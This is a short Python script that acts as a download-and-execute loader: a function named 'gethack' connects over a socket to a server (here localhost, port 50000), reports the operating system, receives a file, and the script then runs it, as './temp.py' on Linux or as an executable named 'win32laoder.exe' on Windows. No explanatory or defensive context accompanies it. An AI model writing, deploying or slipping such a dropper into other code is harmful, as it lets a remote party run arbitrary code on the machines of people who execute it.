import socket                   
from platform import system as _system
from os import system

def gethack(path):
    s = socket.socket()             
    host = "localhost"  
    port = 50000                    

    s.connect((host, port))
    s.send(bytearray(_system().encode('utf-8')))
    print("sending")
    with open(path, 'wb') as f:
        while True:
            print('receiving data...')
            data = s.recv(1024)
            if not data:
                break
            # write data to a file
            f.write(data)

    f.close()
    print('Successfully get the file')
    s.close()
    print('connection closed')

if _system() == "Linux":
    path = "./temp.py"
    gethack(path)
    system(f"python3 {path}")
elif _system() == "Windows":
    path='"C:/win32laoder.exe"'
    gethack(path)
    system(path)